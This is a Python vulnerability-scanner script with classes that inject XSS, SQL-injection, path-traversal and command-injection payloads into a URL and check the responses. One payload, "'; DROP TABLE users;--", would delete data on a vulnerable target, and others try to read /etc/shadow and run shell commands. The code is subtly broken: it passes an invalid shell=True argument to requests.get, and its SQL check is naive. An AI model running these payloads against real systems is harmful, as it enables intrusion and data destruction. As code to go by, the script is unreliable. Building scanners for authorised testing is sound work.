import requests

class XSSChecker:
    def __init__(self):
        self.payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(\"XSS\")'>", "<svg/onload=alert('XSS')>"]

    def check_vulnerabilities(self, url):
        vulnerabilities = []
        for payload in self.payloads:
            modified_url = url.replace('[[PAYLOAD]]', payload)
            response = requests.get(modified_url)
            if payload in response.text:
                vulnerabilities.append(payload)
        return vulnerabilities

class SQLInjectionChecker:
    def __init__(self):
        self.payloads = ["' OR '1'='1", "'; DROP TABLE users;--", "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT('SQL Injection') FROM information_schema.tables--"]

    def check_vulnerabilities(self, url):
        vulnerabilities = []
        for payload in self.payloads:
            modified_url = url.replace('[[PAYLOAD]]', payload)
            response = requests.get(modified_url)
            if "error" in response.text:
                vulnerabilities.append(payload)
        return vulnerabilities

class DirectoryTraversalChecker:
    def __init__(self):
        self.payloads = ["../../../../../etc/passwd", "../../../../etc/hosts", "../../../../etc/shadow"]

    def check_vulnerabilities(self, url):
        vulnerabilities = []
        for payload in self.payloads:
            modified_url = url.replace('[[PAYLOAD]]', payload)
            response = requests.get(modified_url)
            if "root:" in response.text:
                vulnerabilities.append(payload)
        return vulnerabilities

class CommandInjectionChecker:
    def __init__(self):
        self.payloads = ["; ls", "| ls", "$(ls)"]

    def check_vulnerabilities(self, url):
        vulnerabilities = []
        for payload in self.payloads:
            modified_url = url.replace('[[PAYLOAD]]', payload)
            response = requests.get(modified_url, shell=True)
            if "file1.txt" in response.text:
                vulnerabilities.append(payload)
        return vulnerabilities
